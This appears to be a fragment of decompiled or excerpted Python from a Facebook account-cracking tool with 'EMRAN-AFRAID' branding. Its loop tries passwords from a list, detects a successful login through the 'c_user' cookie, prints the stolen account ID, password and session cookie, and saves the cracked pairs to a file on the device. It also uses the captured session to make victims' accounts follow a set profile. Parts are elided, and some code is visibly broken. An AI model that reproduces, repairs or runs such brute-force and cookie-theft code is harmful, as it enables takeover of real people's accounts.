...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        _EMRAN_('xdg-open https://www.facebook.com/OMOR.FARUK.910')
        return None
    if None == '3':
        _EMRAN_('xdg-open https://www.facebook.com/OMOR.FARUK.910')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/OMOR.FARUK.910', {
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mEMRAN-AFRAID-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/EMRAN-AFRAID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[EMRAN-AFRAID] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
